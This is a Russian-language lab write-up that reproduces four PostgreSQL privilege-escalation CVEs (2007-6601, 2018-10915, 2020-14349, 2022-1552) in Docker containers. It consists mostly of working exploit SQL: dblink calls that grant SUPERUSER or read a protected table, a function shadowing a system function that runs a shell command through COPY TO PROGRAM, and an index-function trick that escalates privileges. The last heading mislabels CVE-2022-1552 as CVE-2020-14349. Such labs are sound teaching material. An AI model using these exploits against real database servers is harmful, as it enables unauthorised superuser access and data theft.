# Лабораторная работа №1
Лабораторная работа лежит в [репозитории](https://github.com/x4m/pg_cve_demo)
```shell
git clone https://github.com/x4m/pg_cve_demo.git
```
## CVE-2007-6601
Уязвимая версия Postgres поднимается в docker контейнере
```shell
cd CVE-2007-6601
docker compose up --build
```
![](img/image.png)

Подключение к БД
```shell
psql postgresql://user1:password@127.0.0.1:5432/db1
```

dblink к secret_db
```psql
SELECT dblink_exec('host=localhost dbname=secret_db', 'ALTER USER user1 WITH SUPERUSER;');
```
Переключает текущее подключение на базу secret_db
```psql
\c secret_db;
```
Выводит все данные из таблицы secret_table
```psql
select * from secret_table;
```
![](img/image2.png)

## CVE-2018-10915
```shell
cd CVE-2018-10915
docker compose up --build
```

Подключаемся к серверу на котором есть полный доступ
```shell
psql postgresql://postgres:password@127.0.0.1:5433
```
Чуток магии
```psql
CREATE DATABASE secret_db;
ALTER SYSTEM SET default_transaction_read_only TO on;
SELECT pg_reload_conf();
```
![](img/image3.png)

Цепляемся к серверу с флагом
```shell
psql postgresql://user1:password@127.0.0.1:5432/db1
```
ещё магии
```psql
SELECT * FROM dblink('host=192.168.233.3,localhost port=5433,5432 user=postgres password=password target_session_attrs=read-write dbname=secret_db', 'SELECT * FROM secret_table') AS secret_table(c text);
```
![](img/image4.png)

## CVE-2020-14349
```shell
cd CVE-2020-14349
docker compose up --build
```

цепляемся к БД
```psql
psql postgresql://user1:password@127.0.0.1:5432/db1
```

хитрая функция
```psql
CREATE OR REPLACE FUNCTION public.pg_get_replica_identity_index(int)
RETURNS regclass
LANGUAGE plpgsql
AS $$
BEGIN
    COPY (SELECT 1) TO PROGRAM '/pg12/postgres/bin/psql -c "ALTER USER user1 WITH SUPERUSER;" postgres';
    RETURN pg_catalog.pg_get_replica_identity_index($1);
END;
$$;
```

эксплойт
```psql
\c secret_db
select * from secret_table;
```
![alt text](img/image5.png)


## CVE-2020-14349
```shell
cd CVE-2022-1552
docker compose up --build
```

цепляемся к БД
```shell
psql postgresql://user1:password@127.0.0.1:5432/db1
```


хитрая функция
```psql
CREATE TABLE bttest_a AS SELECT i as id FROM generate_series(1, 1000) i;
ALTER TABLE bttest_a OWNER TO regress_bttest_role;
```
```psql
CREATE OR REPLACE FUNCTION ifun(int8) RETURNS int8 AS $$
BEGIN
 if current_user = 'postgres' then
 ALTER USER user1 WITH superuser;
 end if;
 RETURN $1;
END;
$$ LANGUAGE plpgsql IMMUTABLE;
CREATE INDEX bttest_a_expr_idx ON bttest_a ((ifun(id) + ifun(0)))
 WHERE ifun(id + 10) > ifun(10);
alter function ifun volatile;
select pg_sleep(2);
```

эксплойт
```psql
\c secret_db
SELECT * FROM secret_table;
```
![alt text](img/image6.png)